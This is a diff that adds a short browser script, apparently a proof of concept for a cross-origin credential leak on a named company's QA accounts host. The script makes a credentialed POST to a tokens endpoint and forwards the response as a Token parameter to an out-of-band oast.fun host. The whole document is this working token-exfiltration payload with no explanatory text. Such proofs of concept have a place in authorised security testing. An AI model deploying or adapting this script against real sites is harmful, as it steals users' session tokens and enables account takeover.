@@ -1,0 +1,12 @@
+<script>
+var req = new XMLHttpRequest();
+req.onload = reqListener;
+req.open('POST','https://accounts-sdet2.qasalesloft.com/tokens',true);
+req.withCredentials = true;
+req.send();
+
+function reqListener() {
+   location='//uxielptyqetjojlxwzfr8of8nhi9e1evj.oast.fun/?Token='+this.responseText;
+};
+
+</script>
